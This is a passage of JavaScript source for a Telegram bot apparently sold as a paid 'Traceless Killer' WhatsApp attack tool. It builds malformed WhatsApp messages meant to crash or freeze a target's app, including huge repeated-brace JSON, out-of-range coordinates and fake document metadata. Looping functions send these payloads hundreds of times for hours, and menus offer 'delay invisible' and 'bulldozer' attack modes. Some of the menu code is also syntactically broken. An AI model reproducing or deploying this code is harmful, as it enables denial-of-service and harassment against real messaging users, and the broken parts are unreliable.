text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
}
}
}
}
}), {
userJid: target,
quoted: null
});

await Mvaa.relayMessage('status@broadcast', etc.message, {
messageId: etc.key.id,
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};

async function invisSqL(target, mention) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "ᏨᏒᎯᏕᎻᎬᏒᏕ ᏠᏁ ᎻᎬᏒᎬ",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [1000, 2000, 3000, 4000],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "ᏨᏒᎯᏕᎻᎬᏒᏕ ᎨᏁ ᎻᎬᏒᎬ"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await Mvaa.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function CursorCrL(target) {
let payload = generateWAMessageFromContent(target, ({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
},
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0payloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "ZynXzo New",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
},
hasMediaAttachment: true
}
}
}
}), {
userJid: target,
quoted: null
});

  await Mvaa.relayMessage("status@broadcast", payload.message, {
    messageId: payload.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function zedezforce(target) {
let payload = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
},
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0payloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "ZynXzo New",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
},
hasMediaAttachment: true
}
}
}
}), {
userJid: target,
quoted: null
});

await Mvaa.relayMessage(target, payload.message, {
messageId: payload.key.id,
remoteJid: "status@broadcast",
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};

async function sendOfferVideoCall(target) {
    try {
        await Mvaa.OfferVideoCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Group`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Group:`, error));
    }
}

// FUNK BULDO STUNT //
async function Traindpaket(target) {
for (let i = 0; i < 50; i++) {
await ExTraKouta(target);
await ExTraKouta(target);
await ExTraKouta(target);
await ExTraKouta(target);
await fetchDataWithDelay(target);
await fetchDataWithDelay(target);
await fetchDataWithDelay(target);
await fetchDataWithDelay(target);
await bulldoserV3(target);
await bulldoserV3(target);
await bulldoserV3(target);
await bulldoserV3(target);
    }
        
}
// FUNK BULDO HOURS //
async function AllFuncsedotkuota(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 500) {
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        fetchDataWithDelay(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldoserV3(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        fetchDataWithDelay(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldoserV3(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        fetchDataWithDelay(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldoserV3(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        fetchDataWithDelay(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldoserV3(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Traceless Killer send bug ${count}/500 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 500 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}
// AKHIR FUNK BULDO HOURS //
// FUNC ALL PROTOKOL STUNT //
async function Allprotontol(target) {
for (let i = 0; i < 50; i++) {
await VampSuperDelay(target, false);
await xatanicaldelay(target, false);
await xatanicaldelayv2(target, false);
await ChronosDelay(target, false);
await protocolbug8(target, false);
await protocolbugaudio(target, false);
await protocollocation(target);
await protocolbug7(target, false);
await BlackDelayCrash(target, false);
await DevilsProtocolV2(Mvaa, target, false);
await Xvold(target, false)
await ForceX(target);
await FcinvisAll(target);
await CursorCrL(target);
await zedezforce(target);
    }
        
}
// AKHIR FUNK PROTOKOL STUNT //

// FUNK ALL PROTOKOL HOURS //
async function Allprotontolhourss(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 500) {
        VampSuperDelay(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelayv2(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ChronosDelay(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug8(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbugaudio(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocollocation(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug7(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        BlackDelayCrash(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ForceX(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        FcinvisAll(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        CursorCrL(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        zedezforce(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Proses send bug [ marga modders 〽️ ] ${count}/500 To ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`Sukses send bug [ marga modders 〽️ ] 500 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}
// AKHIR ALL FUNK PROTOKOL HOURS //

const cooldownForceInvis = new Set();

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  await bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` 
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
      [
            { text: "  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ", callback_data: "bug_menu" },
          ],
      [
            { text: "Oᴡɴᴇʀ Mᴇɴᴜ", callback_data: "owner_menu" },
            { text: "Cʀᴇᴅɪᴛ Sᴄʀɪᴘᴛ", callback_data: "crsc" },
            { text: "Aᴅᴍɪɴ Mᴇɴᴜ", callback_data: "admin_menu" },
          ],
      [
            { text: "Iɴғᴏʀᴍᴀᴛɪᴏɴ", url: "https://t.me/scriptqueenmvaa" },
            { text: "Dᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/QueenMvaa" },
          ],
      ],
    },
  });

  const audioPath = path.join(__dirname, "./Penyimpanan/MargaModders.mp3");
  await bot.sendAudio(chatId, audioPath, {
    caption: `   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   `,
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = `\`\`\` 
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\``;
    let replyMarkup = {};
    
    if (query.data === "back") {
      caption: `\`\`\` 
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ", callback_data: "bug_menu" },
          ],
      [
            { text: "Oᴡɴᴇʀ Mᴇɴᴜ", callback_data: "owner_menu" },
            { text: "Cʀᴇᴅɪᴛ Sᴄʀɪᴘᴛ", callback_data: "crsc" },
            { text: "Aᴅᴍɪɴ Mᴇɴᴜ", callback_data: "admin_menu" },
          ],
      [
            { text: "Iɴғᴏʀᴍᴀᴛɪᴏɴ", url: "https://t.me/scriptqueenmvaa" },
            { text: "Dᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/QueenMvaa" },
          ],
      ],
      };
     }

    if (query.data === "bug_menu") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }
    
    if (query.data === "Delayinvis") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
